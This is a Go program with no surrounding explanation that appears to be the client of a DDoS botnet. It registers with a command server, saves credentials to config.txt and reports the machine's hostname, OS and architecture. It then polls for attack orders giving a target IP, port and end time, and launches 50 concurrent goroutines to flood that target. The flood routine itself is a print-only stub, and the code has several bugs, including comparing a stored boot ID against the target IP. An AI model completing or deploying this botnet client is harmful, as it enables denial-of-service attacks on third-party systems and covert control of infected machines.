package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

type Creds struct {
	ID    string `json:"identifier"`
	Token string `json:"token"`
}

type BootInstructions struct {
	ID   string `json:"identifier"`
	Ip   string `json:"ip"`
	Port string `json:"port"`
	End  string `json:"endTime"`
}

func checkConnection(apiURL string) bool {
	var result bool = false

	resp, err := http.Get(apiURL)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		}
	}

	return result
}

func checkAccount(apiURL string, id string, token string) bool {
	var result bool = false
	var checkAccountURL string = apiURL + "/client/check/" + id + "/" + token

	resp, _ := http.Get(checkAccountURL)

	if resp.StatusCode == 200 {
		result = true
	}

	return result
}

func registerAccount(apiURL string) []string {
	var registerAccountURL string = apiURL + "/client/register"
	var result []string

	requestBody, _ := json.Marshal(map[string]string{
		"": "",
	})

	resp, err := http.Post(registerAccountURL, "application/json", bytes.NewBuffer(requestBody))

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Creds
			responseBytes, _ := ioutil.ReadAll(resp.Body)
			json.Unmarshal(responseBytes, &decodedJSON)
			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Token)
		}
	}

	return result
}

func checkFile(filePath string) bool {
	var result bool

	if _, err := os.Stat(filePath); err == nil {
		if err != nil {
			result = false
		} else {
			result = true
		}
	}

	return result
}

func writeToConfigFile(filePath string, id string, token string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	f.WriteString(id + ":" + token)
}

func writeToBootFile(filePath string, id string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	f.WriteString(id)
}

func readFromConfigFile(filePath string) []string {
	data, _ := ioutil.ReadFile(filePath)

	var fileContents string = string(data)
	var result []string = strings.Split(fileContents, ":")

	return result
}

func readFromBootFile(filePath string) string {
	data, _ := ioutil.ReadFile(filePath)

	var result string = string(data)

	return result
}

func updateDetails(apiURL string, id string, token string) {
	var updateURL string = apiURL + "/update/details/" + id + "/" + token

	hostname, _ := os.Hostname()

	requestBody, _ := json.Marshal(map[string]string{
		"hostname": hostname,
		"platform": runtime.GOOS,
		"arch":     runtime.GOARCH,
	})

	resp, err := http.Post(updateURL, "application/json", bytes.NewBuffer(requestBody))

	if err == nil {
		defer resp.Body.Close()
	}
}

func checkBoot(apiURL string, id string, token string) bool {
	var result bool
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	resp, err := http.Get(bootURL)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		} else {
			result = false
		}
	}

	return result
}

func getBootInstructions(apiURL string, id string, token string) []string {
	var result []string
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	resp, err := http.Get(bootURL)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON BootInstructions
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)

			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Ip)
			result = append(result, decodedJSON.Port)
			result = append(result, decodedJSON.End)
		}
	}

	return result
}

func bootRun(apiURL string, id string, token string, bootFilePath string) {
	var bootActive bool = checkBoot(apiURL, id, token)

	if bootActive {
		var bootInstructions []string = getBootInstructions(apiURL, id, token)

		var savedBootID string = readFromBootFile(bootFilePath)

		if savedBootID != bootInstructions[1] {
			writeToBootFile(bootFilePath, bootInstructions[0])

			str := bootInstructions[3]
			t, _ := time.Parse(time.RFC3339, str)

			var endTime string = t.Format("2006-01-02 15:04:05.000000000 +0000 UTC")
			endTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", endTime)

			for i := 0; i < 50; i++ {
				go bootRoutine(id, token, endTimeObject, bootInstructions)
			}

		} else {
			fmt.Println("Already booting")
		}

	} else {
		fmt.Println("No boot")
	}
}

func bootRoutine(id string, token string, endTime time.Time, bootInstructions []string) {
	for {
		var currentTime string = time.Now().UTC().Format("2006-01-02 15:04:05.000000000 +0000 UTC")
		currentTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", currentTime)

		if currentTimeObject.After(endTime) {
			fmt.Println("end")
			break
		}

		flood(bootInstructions[1], bootInstructions[2])
	}
}

func flood(target string, port string) {
	fmt.Println("Flooding " + target + ":" + port)
}

func main() {
	var bootFilePath string = "boot.txt"
	var configPath string = "config.txt"
	var apiURL string = "http://127.0.0.1:5332"

	var apiConnection bool = checkConnection(apiURL)

	if apiConnection == true {
		var configFileExists bool = checkFile(configPath)

		if configFileExists {
			var credidentials []string = readFromConfigFile(configPath)
			var credsValidated = checkAccount(apiURL, credidentials[0], credidentials[1])

			if credsValidated {

				updateDetails(apiURL, credidentials[0], credidentials[1])

				for range time.NewTicker(5 * time.Second).C {
					bootRun(apiURL, credidentials[0], credidentials[1], bootFilePath)
				}

			} else {
				var newCredidentials = registerAccount(apiURL)
				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
				main()
			}

		} else {
			var newCredidentials []string = registerAccount(apiURL)
			writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
			main()
		}

	} else {
		time.Sleep(30 * time.Second)
		main()
	}
}
